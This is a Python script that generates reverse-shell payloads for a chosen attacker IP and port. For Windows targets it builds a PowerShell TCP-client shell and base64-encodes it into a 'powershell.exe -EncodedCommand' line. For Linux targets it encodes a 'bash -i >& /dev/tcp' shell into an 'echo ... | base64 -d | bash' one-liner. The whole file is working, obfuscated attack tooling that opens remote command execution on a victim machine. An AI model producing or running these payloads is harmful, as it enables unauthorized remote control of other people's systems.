#!/usr/bin/python3
import sys,subprocess,base64

def genfile(ip,port):
    filename="powershell.txt"
    content="""$client = New-Object System.Net.Sockets.TCPClient('%s',%s);""" %(ip,port)
    content+="""$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; """
    f = open(filename, "w")
    f.write(content)
    f.close

def genRevershell(ip,port,tartgetOS):
    # Windows
    if (tartgetOS==1):
        # create file powershell.txt
        genfile(ip,port)
        command='''iconv -f ASCII -t UTF-16LE powershell.txt | base64 | tr -d "\n" '''
        rev_shell=subprocess.check_output(command, shell=True)
        print("Full payload for cmd to reverse shell for Windows target is: ")
        print("powershell.exe -EncodedCommand "+str(rev_shell,'utf-8'))
    else :
    # Linux revershell via echo
        # make reverse shell
        shell_pre='bash -i >& /dev/tcp/%s/%s 0>&1' %(ip,port)
        shell=base64.b64encode(shell_pre.encode('utf-8'))
        shell=shell.decode("utf-8")
        print("Full payload for cmd to reverse shell for Linux target is: ")
        #print("""bash -c {echo,%s}|{base64,-d}|{bash,-i}""" %shell)
        print("""echo %s|base64 -d|bash""" %shell)

#print(session) # admin session
def main():
    if len(sys.argv) != 4:
        print ("[+] Usage: %s <your IP> <your port> <your target OS 1: Windows ; 2: Linux>" % sys.argv[0])
        print ('[+] eg: %s 192.168.1.6 1234 1' % sys.argv[0])
        sys.exit(-1)
    ip=sys.argv[1]
    port=sys.argv[2]
    tartgetOS=int(sys.argv[3])
    genRevershell(ip,port,tartgetOS)

if __name__ == "__main__":
    main()
